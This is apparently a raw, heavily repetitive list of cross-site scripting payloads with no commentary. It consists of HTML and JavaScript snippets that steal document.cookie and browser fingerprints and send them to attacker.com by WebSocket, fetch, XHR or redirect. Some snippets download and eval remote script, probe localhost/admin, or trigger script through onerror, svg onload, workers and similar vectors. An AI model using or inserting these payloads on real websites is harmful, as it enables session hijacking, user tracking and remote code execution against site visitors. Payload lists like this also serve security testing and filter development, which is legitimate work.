<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
